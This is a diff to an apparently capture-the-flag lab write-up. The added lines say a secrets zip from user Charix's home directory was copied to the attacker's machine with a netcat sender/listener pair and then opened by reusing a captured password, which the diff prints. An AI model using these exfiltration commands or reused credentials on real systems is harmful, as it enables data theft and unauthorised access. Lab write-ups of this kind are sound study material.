@@ -38,4 +38,9 @@ eaacdfb2d141b72a589233063604209c
 In Charix home directory there is a secrets zip. I download this to analyz further on my machine
 Sender machine : nc 10.10.14.13 1234 < secrets.zip
 Receiver machine : nc -lvnp 1234 > secrets.zip
-The zip requires a password and so we have to try fcrackzip here.
+The zip requires a password and so we try charix passwords and that works
+unzip secret.zip 
+Archive:  secret.zip
+[secret.zip] secret password: Charix!2#4%6&8(0
+
+
